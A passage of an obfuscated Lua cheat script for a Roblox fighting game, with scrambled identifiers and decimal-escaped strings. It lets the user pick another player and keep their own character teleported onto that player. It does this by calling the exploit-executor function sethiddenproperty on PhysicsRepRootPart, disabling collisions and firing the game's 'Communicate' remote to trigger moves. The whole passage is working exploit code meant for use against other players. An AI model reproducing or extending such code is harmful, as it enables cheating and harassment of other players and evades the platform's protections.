"\065\116\111\109\105\099\032\083\108\097\115\104", 0x3BE91BBC0, 0x65, 0x4, "\065\116\111\109\105\099\032\083\108\097\115\104" }, { "\067\114\117\115\104\105\110\103\032\080\117\108\108", 0x3C1F7416E, 0x15, 0x1, "\067\114\117\115\104\105\110\103\032\080\117\108\108" }, { "\087\105\110\100\115\116\111\114\109\032\070\117\114\121", 0x3D86BDFA9, 0x14, 0x2, "\087\105\110\100\115\116\111\114\109\032\070\117\114\121" }, { "\083\116\111\110\101\032\067\111\102\102\105\110", 0x3D364A88F, 0x19, 0x3, "\083\116\111\110\101\032\067\111\102\102\105\110" }, { "\069\120\112\117\108\115\105\118\101\032\080\117\115\104", 0x3DD470A9E, 0x13, 0x4, "\069\120\112\117\108\115\105\118\101\032\080\117\115\104" }, { "\067\111\115\109\105\099\032\083\116\114\105\107\101", 0x3E59E3FDA, 0x1E, 0x1, "\067\111\115\109\105\099\032\083\116\114\105\107\101" }, { "\080\115\121\099\104\105\099\032\082\105\099\111\099\104\101\116", 0x410F95256, 0xF, 0x2, "\080\115\121\099\104\105\099\032\082\105\099\111\099\104\101\116" }, { "\084\101\114\114\105\098\108\101\032\084\111\114\110\097\100\111", 0x405ADE1D9, 0x65, 0x3, "\084\101\114\114\105\098\108\101\032\084\111\114\110\097\100\111" }, { "\083\107\121\032\083\110\097\116\099\104\101\114", 0x428911BAC, 0x11, 0x4, "\083\107\121\032\083\110\097\116\099\104\101\114" }, { "\066\117\108\108\101\116\032\066\097\114\114\097\103\101", 0x424EA9E22, 0x14, 0x1, "\066\117\108\108\101\116\032\066\097\114\114\097\103\101" }, { "\086\097\110\105\115\104\105\110\103\032\075\105\099\107", 0x4273A6237, 0x17, 0x2, "\086\097\110\105\115\104\105\110\103\032\075\105\099\107" }, { "\087\104\105\114\108\119\105\110\100\032\068\114\111\112", 0x428683AB6, 0xF, 0x3, "\087\104\105\114\108\119\105\110\100\032\068\114\111\112" }, { "\072\101\097\100\032\070\105\114\115\116", 0x43B904C5F, 0x14, 0x4, "\072\101\097\100\032\070\105\114\115\116" }, { "\071\114\097\110\100\032\070\105\115\115\117\114\101", 0x75EAD1B1F95A, 0x12, 0x1, "\071\114\097\110\100\032\070\105\115\115\117\114\101" }, { "\084\119\105\110\032\070\097\110\103\115", 0x4664D93C9, 0xF, 0x2, "\084\119\105\110\032\070\097\110\103\115" }, { "\069\097\114\116\104\032\083\112\108\105\116\116\105\110\103\032\083\116\114\105\107\101", 0x4665B290F, 0x1E, 0x3, "\069\097\114\116\104\032\083\112\108\105\116\116\105\110\103\032\083\116\114\105\107\101" }, { "\076\097\115\116\032\066\114\101\097\116\104", 0x6117F1378FD4, 0x65, 0x4, "\076\097\115\116\032\066\114\101\097\116\104" }, { "\082\097\118\097\103\101", 0x3F208EF3E, 17.5, 0x1, "\082\097\118\097\103\101" }, { "\083\119\105\102\116\032\083\119\101\101\112", 0x3F1F4F9A3, 0xF, 0x2, "\083\119\105\102\116\032\083\119\101\101\112" }, { "\067\111\108\108\097\116\101\114\097\108\032\082\117\105\110", 0x408AA664F, 22.5, 0x3, "\067\111\108\108\097\116\101\114\097\108\032\082\117\105\110" }, { "\083\112\105\114\097\108\105\110\103\032\083\116\111\114\109", 0x476A3E943C08, 22.5, 0x4, "\083\112\105\114\097\108\105\110\103\032\083\116\111\114\109" }, { "\083\116\111\105\099\032\066\111\109\098", 0x3FDB13D4B, 0xF, 0x1, "\083\116\111\105\099\032\066\111\109\098" }, { "\050\048\050\048\050\048\032\068\114\111\112\107\105\099\107", 0x40A6FEB43, 0x65, 0x2, "\050\048\045\050\048\045\050\048\032\068\114\111\112\107\105\099\107" }, { "\070\105\118\101\032\083\101\097\115\111\110\115", 0x44C7960B9, 0x64, 0x3, "\070\105\118\101\032\083\101\097\115\111\110\115" }, { "\085\110\108\105\109\105\116\101\100\032\070\108\101\120\032\087\111\114\107\115", 0x46B14121D763, 0x0, 0x4, "\085\110\108\105\109\105\116\101\100\032\070\108\101\120\032\087\111\114\107\115" }, { "\080\101\114\109\097\102\114\111\115\116", 0x5B751EFEA87E, 0x14, 0x1, "\080\101\114\109\097\102\114\111\115\116" }, { "\070\114\111\115\116\032\070\111\114\103\101", 0x7D1C890B331D, 0xF, 0x2, "\070\114\111\115\116\032\070\111\114\103\101" }, { "\070\114\101\101\122\105\110\103\032\080\097\116\104", 0x666D78DD57AB, 0x19, 0x3, "\070\114\101\101\122\105\110\103\032\080\097\116\104" }, { "\074\117\100\103\101\109\101\110\116\032\067\104\097\105\110", 0x44B5CB491D1E, 0x14, 0x4, "\074\117\100\103\101\109\101\110\116\032\067\104\097\105\110" }, { "\087\101\098\111\111\109", 0x66EC9CABB715, 0x14, 0x1, "\087\101\098\111\111\109" }, { "\084\114\105\110\105\116\121\032\084\101\097\114", 0x467E9DCA4C31, 0x19, 0x2, "\084\114\105\110\105\116\121\032\084\101\097\114" }, { "\080\108\097\115\109\097\032\067\097\110\110\111\110", 0x6A2FDA1EFF14, 0x14, 0x3, "\080\108\097\115\109\097\032\067\097\110\110\111\110" }, { "\068\111\117\098\108\101\032\084\114\111\117\098\108\101", 0x7DE9F29653F8, 0x14, 0x4, "\068\111\117\098\108\101\032\084\114\111\117\098\108\101" }, { "\068\111\111\109\032\068\105\118\101", 0x5C64F0B4E7E8, 0x17, 0x1, "\068\111\111\109\032\068\105\118\101" }, { "\067\114\111\119\100\032\066\117\115\116\101\114", 0x5FE64DA60A4F, 0x16, 0x2, "\067\114\111\119\100\032\066\117\115\116\101\114" }, { "\072\097\109\109\101\114\032\072\101\101\108", 0x63B2575B596A, 0x12, 0x3, "\072\097\109\109\101\114\032\072\101\101\108" }, { "\066\105\110\100\105\110\103\032\067\108\111\116\104", 0x728E532EA71F, 0x14, 0x4, "\066\105\110\100\105\110\103\032\067\108\111\116\104" }, { "\072\097\109\109\101\114\032\072\101\101\108", 0x7B0BA1E7B413, 0x12, 0x3, "\072\097\109\109\101\114\032\072\101\101\108" }, { "\077\097\099\104\105\110\101\032\071\117\110\032\066\108\111\119\115", 0x30525E1EE, 0xF, 0x1, "\077\097\099\104\105\110\101\032\071\117\110\032\066\108\111\119\115" }, { "\067\114\117\115\104\101\100\032\082\111\099\107", 0x41E4FAC54CF9, 9.58, 0x4, "\067\114\117\115\104\101\100\032\082\111\099\107" }, { "\066\108\111\099\107", 0x31D8E78D1, 0x0, 0x0, "\066\108\111\099\107" }, { "\066\108\111\099\107", 0x31CEEBF71, 0x0, 0x0, "\066\108\111\099\107" }, { "\066\108\111\099\107", 0x33E9F9888, 0x0, 0x0, "\066\108\111\099\107" }, } local function _IlIlIlIlll() local _IIllIIlllI = _llIlIIlIll.Character if not _IIllIIlllI then return end
 for _lIIlIllIlI, _lIIlIIlllI in pairs(_IIllIIlllI:GetDescendants()) do if _lIIlIIlllI:IsA("\066\097\115\101\080\097\114\116") then _lIIlIIlllI.CanCollide = false end
 end
 end
 local _IIIIIIlllI = {} local function _IlIlllllII() if not _IIIIIIllIl or not _IIIIIIllIl.Character then return end
 if not _llIlIIlIll.Character then return end
 local _lIlllIllII = _llIlIIlIll.Character:FindFirstChild("\072\117\109\097\110\111\105\100\082\111\111\116\080\097\114\116") local _lIlIIlIIll = _IIIIIIllIl.Character:FindFirstChild("\072\117\109\097\110\111\105\100\082\111\111\116\080\097\114\116") if not _lIlllIllII or not _lIlIIlIIll then return end
 _IIIIIIlllI = {} for _lIIlIllIlI, _lIIlIIlllI in pairs(_llIlIIlIll.Character:GetDescendants()) do if _lIIlIIlllI:IsA("\066\097\115\101\080\097\114\116") then _IIIIIIlllI[_lIIlIIlllI] = { CanCollide = _lIIlIIlllI.CanCollide, Massless = _lIIlIIlllI.Massless } _lIIlIIlllI.CanCollide = false _lIIlIIlllI.Massless = true end
 end
 local _lIlIIllIII = _llIlIIlIll.Character:FindFirstChildOfClass("\072\117\109\097\110\111\105\100") if _lIlIIllIII then pcall( function () _lIlIIllIII.AutoRotate = false end
 ) _lIlIIllIII.PlatformStand = true end
 _lIlllIllII.CFrame = _lIlIIlIIll.CFrame * _llllllllII _lIlllIllII.AssemblyLinearVelocity = Vector3.zero _lIlllIllII.AssemblyAngularVelocity = Vector3.zero if sethiddenproperty then pcall( function () sethiddenproperty(_lIlllIllII, "\080\104\121\115\105\099\115\082\101\112\082\111\111\116\080\097\114\116", _lIlIIlIIll) end
 ) end
 end
 local function _IIlIIlIIIl(_IlIIIIIlII) _llllllllII = _IlIIIIIlII end
 local _IlIllIIllI = {} local function _IIlllllIII() for _lIIlIllIlI, _IlIlIllIll in pairs(_IlIllIIllI) do pcall( function () _IlIlIllIll:Disconnect() end
 ) end
 _IlIllIIllI = {} end
 local _IllIllIIlI = { { _IlIIIllllI = "\049\054\049\051\054\049\052\052\053\054\056", _lIIIIllIIl = "\073\100\108\101\032\049", tpos = 0.69, free = true, oscillate = true, tposMin = 0.45, tposMax = 0.70, _IllIIllIlI = 0.1 }, { _IlIIIllllI = "\049\055\056\054\049\056\052\048\049\054\055", _lIIIIllIIl = "\073\100\108\101\032\050", tpos = 0x1, free = false, oscillate = false }, { _IlIIIllllI = "\049\054\053\050\052\053\050\050\054\055\051", _lIIIIllIIl = "\073\100\108\101\032\051", tpos = 0.71, free = false, oscillate = false }, { _IlIIIllllI = "\049\053\048\057\057\055\053\054\049\051\050", _lIIIIllIIl = "\073\100\108\101\032\052", tpos = 0x0, free = true, oscillate = false }, } local function _IIIIllIIIl() if not _IllIIlIIll or not _lIllllllll then return end
 local _lIIIIllIll = tick() if _llllllllIl and _llllllllIl.IsPlaying and (_lIIIIllIll - _IlIlllIlll) < 0.1 then return end
 _IlIlllIlll = _lIIIIllIll local _IIllIIlllI = _llIlIIlIll.Character local _IIIIllIllI = _IIllIIlllI and _IIllIIlllI:FindFirstChildWhichIsA("\072\117\109\097\110\111\105\100") local _IIlIIIIIIl = _IIIIllIllI and _IIIIllIllI:FindFirstChildWhichIsA("\065\110\105\109\097\116\111\114") if not _IIlIIIIIIl then return end
 local _IIlIlIIlll local _IllIIIllll = _lIIlIllIlI.StandIdleAnimDropdown and _lIIlIllIlI.StandIdleAnimDropdown.Value or "\082\097\110\100\111\109" if _IllIIIllll ~= "\082\097\110\100\111\109" then for _lIIlIllIlI, _lIllllllII in ipairs(_IllIllIIlI) do if _lIllllllII.name == _IllIIIllll then _IIlIlIIlll = _lIllllllII break end
 end
 end
 if not _IIlIlIIlll then local _IIIllIIIIl repeat _IIIllIIIIl = math.random(0x1, #_IllIllIIlI) until _IIIllIIIIl ~= _IlllIlIIII _IlllIlIIII = _IIIllIIIIl _IIlIlIIlll = _IllIllIIlI[_IIIllIIIIl] end
 if _IIIIIIIlIl then _IIIIIIIlIl:Disconnect() _IIIIIIIlIl = nil end
 if _llllllllIl then pcall( function () _llllllllIl:Stop(0x0) end
 ) _llllllllIl = nil end
 local _lllIllIIlI = Instance.new("\065\110\105\109\097\116\105\111\110") _lllIllIIlI.AnimationId = "\114\098\120\097\115\115\101\116\105\100\058\047\047" .. _IIlIlIIlll.id local _IlIlIIllII = _IIlIIIIIIl:LoadAnimation(_lllIllIIlI) _IlIlIIllII.Priority = Enum.AnimationPriority.Action4 _IlIlIIllII.Looped = true _llllllllIl = _IlIlIIllII if _IIlIlIIlll.free then _IlIlIIllII:Play() _IlIlIIllII:AdjustWeight(0x1) if _IIlIlIIlll.oscillate then _IlIlIIllII.TimePosition = _IIlIlIIlll.tpos _IlIlIIllII:AdjustSpeed(-(_IIlIlIIlll.speed or 0.1)) elseif _IIlIlIIlll.tpos then _IlIlIIllII.TimePosition = _IIlIlIIlll.tpos end
 _IIIIIIIlIl = RunService.RenderStepped:Connect( function () if not _IllIIlIIll then if _IIIIIIIlIl then _IIIIIIIlIl:Disconnect() _IIIIIIIlIl = nil end
 pcall( function () _IlIlIIllII:Stop(0x0) end
 ) _llllllllIl = nil return end
 if _lllIIIIIll > 0x0 then if _IlIlIIllII.IsPlaying then pcall( function () _IlIlIIllII:Stop(0x0) end
 ) end
 return end
 if not _IlIlIIllII.IsPlaying then return end
 _IlIlIIllII:AdjustWeight(0x1) if _IIlIlIIlll.freezeAt and _IlIlIIllII.TimePosition >= _IIlIlIIlll.freezeAt then _IlIlIIllII:AdjustSpeed(0x0) _IlIlIIllII.TimePosition = _IIlIlIIlll.freezeAt elseif _IIlIlIIlll.oscillate then local _IllIIIIIII = _IIlIlIIlll.speed or 0.1 if _IlIlIIllII.TimePosition >= _IIlIlIIlll.tposMax then _IlIlIIllII:AdjustSpeed(-_IllIIIIIII) elseif _IlIlIIllII.TimePosition <= _IIlIlIIlll.tposMin then _IlIlIIllII:AdjustSpeed(_IllIIIIIII) end
 end
 end
 ) else _IlIlIIllII:Play() _IlIlIIllII:AdjustSpeed(0x0) _IlIlIIllII:AdjustWeight(0x1) _IlIlIIllII.TimePosition = _IIlIlIIlll.tpos _IIIIIIIlIl = RunService.RenderStepped:Connect( function () if not _IllIIlIIll then if _IIIIIIIlIl then _IIIIIIIlIl:Disconnect() _IIIIIIIlIl = nil end
 pcall( function () _IlIlIIllII:Stop(0x0) end
 ) _llllllllIl = nil return end
 if _lllIIIIIll > 0x0 then if _IlIlIIllII.IsPlaying then pcall( function () _IlIlIIllII:Stop(0x0) end
 ) end
 return end
 if not _IlIlIIllII.IsPlaying then return end
 _IlIlIIllII:AdjustSpeed(0x0) _IlIlIIllII:AdjustWeight(0x1) _IlIlIIllII.TimePosition = _IIlIlIIlll.tpos end
 ) end
 end
 local function _IIllllIIII() _lllIIIIIll = 0x0 _IlIlllIlll = 0x0 if _IIIIIIIlIl then _IIIIIIIlIl:Disconnect() _IIIIIIIlIl = nil end
 if _llllllllIl then pcall( function () _llllllllIl:Stop(0x0) end
 ) _llllllllIl = nil end
 if _IlllIIlIlI then _IlllIIlIlI:Disconnect() _IlllIIlIlI = nil end
 if _IIllIIlllI then _IIllIIlllI:Disconnect() _IIllIIlllI = nil end
 if _lIlllIIIII then _lIlllIIIII:Disconnect() _lIlllIIIII = nil end
 if _lllIlIIIIl then _lllIlIIIIl:Disconnect() _lllIlIIIIl = nil end
 if _llIIIlIIIl then _llIIIlIIIl:Disconnect() _llIIIlIIIl = nil end
 if _IlIIIlIIII then _IlIIIlIIII:Disconnect() _IlIIIlIIII = nil end
 _IIlllllIII() pcall( function () if _llIlIIlIll.Character then local _lIlIIllIII = _llIlIIlIll.Character:FindFirstChildWhichIsA("\072\117\109\097\110\111\105\100") if _lIlIIllIII then _lIlIIllIII.PlatformStand = false pcall( function () _lIlIIllIII.AutoRotate = true end
 ) end
 local _lIlIllIlIl = _llIlIIlIll.Character:FindFirstChild("\072\117\109\097\110\111\105\100\082\111\111\116\080\097\114\116") if _lIlIllIlIl then _lIlIllIlIl.AssemblyLinearVelocity = Vector3.zero _lIlIllIlIl.AssemblyAngularVelocity = Vector3.zero pcall( function () _lIlIllIlIl.Velocity = Vector3.zero end
 ) pcall( function () _lIlIllIlIl.RotVelocity = Vector3.zero end
 ) if sethiddenproperty then pcall( function () sethiddenproperty(_lIlIllIlIl, "\080\104\121\115\105\099\115\082\101\112\082\111\111\116\080\097\114\116", _lIlIllIlIl) end
 ) end
 end
 for _lIllllllII, state in pairs(_IIIIIIlllI) do if _lIllllllII and _lIllllllII.Parent then _lIllllllII.CanCollide = state.CanCollide _lIllllllII.Massless = state.Massless end
 end
 _IIIIIIlllI = {} end
 end
 ) _lIlIlIllIl = { 0x0, 0x0, 0x0, 0x0 } end
 local function _IllllIllll() _lIllllllll = not _lIllllllll if _lIllllllll then _llIllIIlll() else if _IlllIIlIlI then _IlllIIlIlI:Disconnect() _IlllIIlIlI = nil end
 if _IIllIIlllI then _IIllIIlllI:Disconnect() _IIllIIlllI = nil end
 pcall( function () local _IIIIllIllI = _llIlIIlIll.Character and _llIlIIlIll.Character:FindFirstChildOfClass("\072\117\109\097\110\111\105\100") if _IIIIllIllI then _IIIIllIllI.PlatformStand = false end
 end
 ) end
 pcall( function () _lIIlIllIlI.StandMethodDropdown:SetValue(_lIllllllll and "\070\111\108\108\111\119" or "\068\111\110\039\116\032\070\111\108\108\111\119") end
 ) end
 local function _lllIllllII(_IllIIllllI) local _IIllIIlllI = _IllIIllllI.Character if not _IIllIIlllI then return end
 local _lIlIIllIII = _IIllIIlllI:FindFirstChildWhichIsA("\072\117\109\097\110\111\105\100") if not _lIlIIllIII then return end
 if _lIlllIIIII then _lIlllIIIII:Disconnect() _lIlllIIIII = nil end
 _lIlllIIIII = _lIlIIllIII.AnimationPlayed:Connect( function (_IlIlIlIlIl) local _IIIIIIIlII = _IlIlIlIlIl.Animation and _IlIlIlIlIl.Animation.AnimationId or '' if _IIIIIIIlII:match("\049\048\052\055\048\051\056\057\056\050\055") or _IIIIIIIlII:match("\049\051\051\056\048\055\055\056\049\057\051") or _IIIIIIIlII:match("\049\051\051\055\048\051\049\048\053\049\051") or _IIIIIIIlII:match("\049\051\057\051\053\053\052\056\053\053\050") then _IIllIlIllI = _IIllIlIllI + 0x1 if _IIllIlIllI >= 0x3 then _IIllIlIllI = 0x0 _IllllIllll() end
 task.delay(0x1, function () if _IIllIlIllI > 0x0 then _IIllIlIllI = _IIllIlIllI - 0x1 end
 end
 ) return end
 for _lIIlIllIlI, _IIIIllllII in pairs(_lllIllIIII) do if _IIIIIIIlII == "\114\098\120\097\115\115\101\116\105\100\058\047\047" .. tostring(_IIIIllllII[0x2]) then local _IIIIlllIlI = _IIIIllllII[0x4] if _IIIIlllIlI == 0x0 then break end
 _lIlIlIllIl[_IIIIlllIlI] = _IIIIllllII[0x3] task.spawn( function () task.wait(_IIIIllllII[0x3]) _lIlIlIllIl[_IIIIlllIlI] = 0x0 end
 ) end
 end
 end
 ) _IIlllllIII() for _lIIlIllIlI, _IIIIllllII in pairs(_lllIllIIII) do local _IIIIlllIII = "\072\111\108\100\105\110\103" .. string.gsub(_IIIIllllII[0x1], "\032", '') pcall( function () _IIllIIlllI:SetAttribute(_IIIIlllIII, false) end
 ) local _IllIIlIllI = _IIllIIlllI:GetAttributeChangedSignal(_IIIIlllIII):Connect( function () if _IIllIIlllI:GetAttribute(_IIIIlllIII) == true and _lIlIlIllIl[_IIIIllllII[0x4]] ~= 0x0 then for _lIIlIllIlI, other in pairs(_lllIllIIII) do if other[0x4] == _IIIIllllII[0x4] and _llIlIIlIll.Backpack:FindFirstChild(other[0x5]) then pcall( function () _llIlIIlIll.Character.Communicate:FireServer(unpack({{ Tool = _llIlIIlIll.Backpack:WaitForChild(other[0x5]), Goal = "\067\111\110\115\111\108\101\032\077\111\118\101", }})) end
 ) end
 end
 end
 end
 ) table.insert(_IlIllIIllI, _IllIIlIllI) end
 end
 local function _lIIIIlIIIl() if _llIIIlIIIl then _llIIIlIIIl:Disconnect() _llIIIlIIIl = nil end
 local _IIllIIlllI = _llIlIIlIll.Character if not _IIllIIlllI then return end
 local _lIlIIllIII = _IIllIIlllI:FindFirstChildWhichIsA("\072\117\109\097\110\111\105\100") local _IIlIIIIIIl = _lIlIIllIII and _lIlIIllIII:FindFirstChildWhichIsA("\065\110\105\109\097\116\111\114") if not _lIlIIllIII then return end
 local function _lIllIlllIl(_IlIlIlIlIl) local _IIIIIIIlII = _IlIlIlIlIl.Animation and _IlIlIlIlIl.Animation.AnimationId or '' _IIIIIIIlII = _IIIIIIIlII:gsub("\037\115\043", '') for _lIIlIllIlI, _IIIIllllII in pairs(_lllIllIIII) do local _IIlllllIIl = "\114\098\120\097\115\115\101\116\105\100\058\047\047" .. tostring(_IIIIllllII[0x2]) if _IIIIIIIlII == _IIlllllIIl then if _IIIIllllII[0x4] == 0x0 then break end
 _IIlIIlIIIl(_lIllIlIIll) task.spawn( function () if _IIllIIlllI then _IIllIIlllI:Disconnect() _IIllIIlllI = nil end
 local _lIlllIlIIl = _llIlIIlIll.Character and _llIlIIlIll.Character:FindFirstChild("\072\117\109\097\110\111\105\100\082\111\111\116\080\097\114\116") local _lIIIIIlllI = ( not _lIllllllll) and _lIlllIlIIl and _lIlllIlIIl.CFrame _lllIIIIIll = _lllIIIIIll + 0x1 pcall( function () local _lIlIIllIII = _llIlIIlIll.Character and _llIlIIlIll.Character:FindFirstChildWhichIsA("\072\117\109\097\110\111\105\100") if _lIlIIllIII then _lIlIIllIII.PlatformStand = false end
 end
 ) _IIllIIlllI = RunService.Heartbeat:Connect( function () local _llIIIIIllI = _llIlIIlIll.Character and _llIlIIlIll.Character:FindFirstChild("\072\117\109\097\110\111\105\100\082\111\111\116\080\097\114\116") local _IllIIIIlII = _IIIIIIllIl and _IIIIIIllIl.Character and _IIIIIIllIl.Character:FindFirstChild("\072\117\109\097\110\111\105\100\082\111\111\116\080\097\114\116") if _llIIIIIllI and _IllIIIIlII then _llIIIIIllI.CFrame = _IllIIIIlII.CFrame * _lIllIlIIll _llIIIIIllI.AssemblyLinearVelocity = Vector3.zero _llIIIIIllI.AssemblyAngularVelocity = Vector3.zero if sethiddenproperty then pcall( function () sethiddenproperty(_llIIIIIllI, "\080\104\121\115\105\099\115\082\101\112\082\111\111\116\080\097\114\116", _IllIIIIlII) end
 ) end
 end
 end
 ) _IlIlIlIlIl.Stopped:Wait() if _IIllIIlllI then _IIllIIlllI:Disconnect() _IIllIIlllI = nil end
 _lllIIIIIll = math.max(0x0, _lllIIIIIll - 0x1) if _lllIIIIIll > 0x0 then return end
 _IIlIIlIIIl(_llIlIllIII) if _lIllllllll then _IlIlllIlll = 0x0 else local _llIIIIlIlI = _llIlIIlIll.Character and _llIlIIlIll.Character:FindFirstChild("\072\117\109\097\110\111\105\100\082\111\111\116\080\097\114\116") if _llIIIIlIlI and _lIIIIIlllI then _llIIIIlIlI.CFrame = _lIIIIIlllI _llIIIIlIlI.AssemblyLinearVelocity = Vector3.zero _llIIIIlIlI.AssemblyAngularVelocity = Vector3.zero end
 end
 end
 ) break end
 end
 end
 _llIIIlIIIl = _lIlIIllIII.AnimationPlayed:Connect(_lIllIlllIl) if _IIlIIIIIIl then local _IIlIIIlIlI = _IIlIIIIIIl.AnimationPlayed:Connect(_lIllIlllIl) local _IlIIllIIII = _llIIIlIIIl _llIIIlIIIl = { Disconnect = function () pcall( function () _IlIIllIIII:Disconnect() end
 ) pcall( function () _IIlIIIlIlI:Disconnect() end
 ) end
 } end
 end
 _llIllIIlll = function () if _IlllIIlIlI then _IlllIIlIlI:Disconnect() _IlllIIlIlI = nil end
 _IlllIIlIlI = RunService.Heartbeat:Connect( function () if not _IllIIlIIll or _lllIIIIIll > 0x0 then return end
 if not _IIIIIIllIl or not _IIIIIIllIl.Character then return end
 if not _llIlIIlIll.Character then return end
 local _lIlllIllII = _llIlIIlIll.Character:FindFirstChild("\072\117\109\097\110\111\105\100\082\111\111\116\080\097\114\116") local _lIlIIlIIll = _IIIIIIllIl.Character:FindFirstChild("\072\117\109\097\110\111\105\100\082\111\111\116\080\097\114\116") if not _lIlllIllII or not _lIlIIlIIll then return end
 local _lIlIIllIII = _llIlIIlIll.Character:FindFirstChildOfClass("\072\117\109\097\110\111\105\100") if _lIlIIllIII then pcall( function () _lIlIIllIII.AutoRotate = false end
 ) if _lIllllllll then _lIlIIllIII.PlatformStand = true end
 end
 if _lIllllllll then _IlIlIlIlll() _lIlllIllII.CFrame = _lIlIIlIIll.CFrame * _llllllllII _lIlllIllII.AssemblyLinearVelocity = Vector3.zero _lIlllIllII.AssemblyAngularVelocity = Vector3.zero if sethiddenproperty then pcall( function () sethiddenproperty(_lIlllIllII, "\080\104\121\115\105\099\115\082\101\112\082\111\111\116\080\097\114\116", _lIlIIlIIll) end
 ) end
 local _llIllllIII = false if not _llllllllIl then _llIllllIII = true else local _lIlllIllIl, _playing = pcall( function () return _llllllllIl.IsPlaying end
 ) _llIllllIII = not _lIlllIllIl or not _playing end
 if _llIllllIII then local _lIlllIlIll = tick() if _lIlllIlIll - _IlIlllIlll >= 0x1 then _IlIlllIlll = _lIlllIlIll task.defer(_IIIIllIIIl) end
 end
 end
 end
 ) end
 local function _IllIIlllll(_IllIIllllI) _IIllllIIII() _IllIIlIIll = true _IIIIIIllIl = _IllIIllllI _llllllllII = _llIlIllIII local _IIllIIlllI = _IllIIllllI.Character if not _IIllIIlllI then _lllIlIIIIl = _IllIIllllI.CharacterAdded:Connect( function (_IIllIIlllI) local _lIlIIllIII = _IIllIIlllI:WaitForChild("\072\117\109\097\110\111\105\100", 0xA) if not _lIlIIllIII then return end
 _lIlIIllIII:WaitForChild("\065\110\105\109\097\116\111\114", 0xA) _IllIIlllll(_IllIIllllI) end
 ) return end
 _IlIlllllII() _lllIllllII(_IllIIllllI) _lIIIIlIIIl() _llIllIIlll() task.defer(_IIIIllIIIl) _lllIlIIIIl = _IllIIllllI.CharacterAdded:Connect( function (_IIllIIlllI) local _lIlIIllIII = _IIllIIlllI:WaitForChild("\072\117\109\097\110\111\105\100", 0xA) if not _lIlIIllIII then return end
 _lIlIIllIII:WaitForChild("\065\110\105\109\097\116\111\114", 0xA) if _IllIIlIIll then _IllIIlllll(_IllIIllllI) end
 end
 ) if _IlIIIlIIII then _IlIIIlIIII:Disconnect() end
 _IlIIIlIIII = game:GetService("\080\108\097\121\101\114\115").PlayerRemoving:Connect( function (_lIIlIIlllI) if _lIIlIIlllI == _IllIIllllI then _IlIIIIIlIl() pcall( function () _lIIlIllIlI.StandMethodDropdown:SetValue("\079\102\102") end
 ) _IIIllIIlll:Notify({ Title = _IlIIIlllII("\083\116\097\110\100"), Content = "\084\097\114\103\101\116\032\104\097\115\032\108\101\102\116\032\116\104\101\032\103\097\109\101\046", _IlllIlIllI = 0x3 }) end
 end
 ) if _lllIlIlIlI then _lllIlIlIlI:Disconnect() end
 _lllIlIlIlI = _llIlIIlIll.CharacterAdded:Connect( function (_IIllIIlllI) local _lIlIIllIII = _IIllIIlllI:WaitForChild("\072\117\109\097\110\111\105\100", 0xA) if not _lIlIIllIII then return end
 _lIlIIllIII:WaitForChild("\065\110\105\109\097\116\111\114", 0xA) if not _IllIIlIIll then return end
 if _IIIIIIIlIl then _IIIIIIIlIl:Disconnect() _IIIIIIIlIl = nil end
 if _llllllllIl then pcall( function () _llllllllIl:Stop(0x0) end
 ) _llllllllIl = nil end
 _IlIlllIlll = 0x0 _IlIlllllII() _lIIIIlIIIl() if _lIllllllll then task.defer(_IIIIllIIIl) end
 end
 ) end
 local function _IlIIIIIlIl() _IllIIlIIll = false _IIllllIIII() if _lllIlIlIlI then _lllIlIlIlI:Disconnect() _lllIlIlIlI = nil end
 end
 local function _IIlIllllII() local _IllllllIIl = game:GetService("\080\108\097\121\101\114\115").LocalPlayer local _lIlIlllIIl = {} for _lIIlIllIlI, _lIIlIIlllI in pairs(game:GetService("\080\108\097\121\101\114\115"):GetPlayers()) do if _lIIlIIlllI ~= _IllllllIIl then table.insert(_lIlIlllIIl, _IIIlIllIlI(_lIIlIIlllI)) end
 end
 return _lIlIlllIIl end
 local _lllIIIIlIl = _IIlIllllII() local _IllIlIlIIl = "" local _lIllIIlIlI = _lIIIlIlIll:AddDropdown("\083\116\097\110\100\084\097\114\103\101\116\068\114\111\112\100\111\119\110", { Text = "\084\097\114\103\101\116\032\080\108\097\121\101\114", Values = _lllIIIIlIl, Default = "", Searchable = true, AllowNull = true, Callback = function (_IIlIlIIlII) if _IIlIlIIlII ~= "" and _IIlIlIIlII == _IllIlIlIIl then pcall( function () _lIIlIllIlI.StandTargetDropdown:SetValue("") end
 ) _IllIlIlIIl = "" _IlIIIIIlIl() _IIIIIIllIl = nil return end
 _IllIlIlIIl = _IIlIlIIlII local _IlllIIlllI = _IllIIlIIll _IlIIIIIlIl() local _lIIllllIll = _IIlllIllII(_IIlIlIIlII) if _lIIllllIll then _IIIIIIllIl = _lIIllllIll if _IlllIIlllI then _IllIIlllll(_lIIllllIll) end
 end
 end
 , }) game:GetService("\080\108\097\121\101\114\115").PlayerAdded:Connect( function () pcall( function () _lIllIIlIlI:SetValues(_IIlIllllII()) end
 ) end
 ) game:GetService("\080\108\097\121\101\114\115").PlayerRemoving:Connect( function () pcall( function () _lIllIIlIlI:SetValues(_IIlIllllII()) end
 ) end
 ) _lIIIlIlIll:AddDropdown("\083\116\097\110\100\077\101\116\104\111\100\068\114\111\112\100\111\119\110", { Text = "\083\116\097\110\100\032\077\101\116\104\111\100", Values = { "\079\102\102", "\070\111\108\108\111\119", "\068\111\110\039\116\032\070\111\108\108\111\119" }, Default = "\079\102\102", Callback = function (_IIlIlIIlII) if _IIlIlIIlII == "\079\102\102" then _IllIIlIIll = false _lIllllllll = true _IlIIIIIlIl() elseif _IIlIlIIlII == "\070\111\108\108\111\119" then _lIllllllll = true local _lllIIlIIIl = _lIIlIllIlI.StandTargetDropdown and _lIIlIllIlI.StandTargetDropdown.Value or "" local _IIIIlllIll = _IIlllIllII(tostring(_lllIIlIIIl)) if _IIIIlllIll then _IllIIlllll(_IIIIlllIll) else _IIIllIIlll:Notify({ Title = _IlIIIlllII("\083\116\097\110\100"), Content = "\080\108\101\097\115\101\032\115\101\108\101\099\116\032\097\032\118\097\108\105\100\032\116\097\114\103\101\116\032\102\105\114\115\116\046", _IlllIlIllI = 0x3 }) pcall( function () _lIIlIllIlI.StandMethodDropdown:SetValue("\079\102\102") end
 ) end
 elseif _IIlIlIIlII == "\068\111\110\039\116\032\070\111\108\108\111\119" then _lIllllllll = false local _lllIIlIIIl = _lIIlIllIlI.StandTargetDropdown and _lIIlIllIlI.StandTargetDropdown.Value or "" local _IIIIlllIll = _IIlllIllII(tostring(_lllIIlIIIl)) if _IIIIlllIll then _IllIIlllll(_IIIIlllIll) if _IlllIIlIlI then _IlllIIlIlI:Disconnect() _IlllIIlIlI = nil end
